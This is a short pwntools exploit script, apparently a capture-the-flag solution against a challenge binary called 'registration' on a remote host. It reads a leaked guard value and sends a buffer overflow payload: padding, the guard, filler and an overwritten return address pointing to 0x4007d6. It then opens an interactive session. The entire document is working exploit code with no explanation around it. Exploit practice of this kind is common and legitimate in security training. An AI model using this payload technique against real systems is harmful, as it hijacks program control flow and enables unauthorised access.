#!/bin/python3.8

from pwn import *
import re

p = remote('140.110.112.77', 6128)
#p = process('./registration')

def getRandomGuard():
    text = p.recvuntil('id :')
    text = p.recv(4096)
    random_guard = int(text.split(b'\n')[0])
    print(f'guard: {random_guard}')
    return random_guard

random_guard = getRandomGuard()
p.sendline('a')

payload =  b''
payload += b'A'*60
payload += b'%c\x00\x00\x00' % random_guard
payload += b'B'*8
payload += p64(0x4007d6)

p.sendline(payload)
p.recv(4096)
p.interactive()
